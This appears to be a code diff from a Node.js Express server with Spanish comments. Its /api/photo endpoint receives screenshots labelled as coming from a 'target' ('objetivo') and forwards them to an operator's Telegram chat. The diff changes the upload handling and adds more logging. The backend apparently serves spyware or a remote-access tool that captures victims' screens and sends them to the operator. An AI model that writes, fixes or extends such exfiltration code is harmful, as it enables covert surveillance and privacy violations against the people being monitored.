@@ -363,13 +363,15 @@ app.post('/api/photo', upload.single('photo'), async (req, res) => {
 
     if (req.file) {
         try {
+            console.log(`[PHOTO] Recibido archivo de ${targetId}. Tamaño: ${req.file.size} bytes`);
+            
             const formData = new FormData();
             formData.append('chat_id', ownerChatId);
             formData.append('caption', `📸 Screenshot del objetivo: ${targetId} — ${new Date().toLocaleString('es-ES')}`);
 
-            // Native Node 24 Blob conversion
-            const blob = new Blob([req.file.buffer], { type: 'image/jpeg' });
-            formData.append('photo', blob, 'screenshot.jpg');
+            // Usar buffer directamente en lugar de Blob para mejor compatibilidad
+            // Telegram API acepta Buffer como stream
+            formData.append('photo', req.file.buffer, 'screenshot.jpg');
 
             const tgRes = await fetch(`${BASE_URL}/sendPhoto`, {
                 method: 'POST',
@@ -379,18 +381,21 @@ app.post('/api/photo', upload.single('photo'), async (req, res) => {
             const tgJson = await tgRes.json();
             if (!tgJson.ok) {
                 console.error(`[-] Telegram API rechazó la foto (Error ${tgJson.error_code}): ${tgJson.description}`);
+                console.error(`    Detalles: ${JSON.stringify(tgJson)}`);
             } else {
                 console.log(`[+] Foto reenviada a Telegram exitosamente para ID: ${targetId}`);
+                console.log(`    File ID: ${tgJson.result?.photo?.[0]?.file_id || 'N/A'}`);
             }
 
         } catch (e) {
             console.error('[-] Error de red enviando foto a tg:', e.message);
+            console.error('[-] Stack:', e.stack);
         }
     } else {
         console.warn(`[-] /api/photo recibió solicitud sin archivo 'photo' adjunto para ID: ${targetId}`);
     }
     res.json({ success: true });
-});
+})
 
 // Endpoint temporal para debuggear errores de frontend
 app.post('/api/log', (req, res) => {
